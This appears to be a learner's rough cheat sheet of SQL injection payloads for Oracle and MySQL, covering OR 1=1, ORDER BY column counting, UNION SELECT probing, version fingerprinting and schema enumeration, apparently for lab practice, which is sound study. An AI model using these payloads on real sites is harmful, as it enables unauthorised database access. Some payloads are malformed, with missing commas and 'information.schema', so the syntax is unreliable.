## SQL injection

- SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
- When pattern tags selection use a OR 1=1--
- Info about database : Type and version
- Tables and columns
- Determine number of column and which contain a text data

### Oracle
- `' UNION SELECT 'strings1' 'strings2' FROM dual` same result with because `NULL` is not defined data.
- `' UNION SELECT NULL NULL FROM dual`
- A `--` can count and if you use `--+` it possible that it a `Mysql` 
`' ORDER BY 1--+`
`' ORDER BY 2--+`
`' ORDER BY 3--+` <- If not work is because you have only two columns used during query.

### MySQL
Switch between  `'abc' NULL` to `NULL, 'def'` is not important if two work test just one for column name
`' UNION SELECT @@version, 'def'--+`

### Non Oracle

Check a number of columns used, 1, 2 ? It a strings / text column ?
- `' ... table_name, column_name FROM information.schema.columns`

### Oracle Again ?
